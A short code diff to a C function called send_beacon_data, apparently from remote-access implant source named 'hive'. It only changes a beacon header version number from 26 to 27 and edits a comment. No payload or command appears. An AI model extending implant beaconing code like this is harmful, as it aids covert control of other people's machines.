@@ -340,9 +340,8 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	bhdr.os = htons(LINUX_X86);
 #endif
 
-	// for hive-2.4, does this need to be changed?
-	//bhdr.version = htons(24);
-	bhdr.version = htons(26);
+	//TODO: Change this number whenever the version changes.
+	bhdr.version = htons(27);
 
 	//Populate Additional Headers
 	//mac address
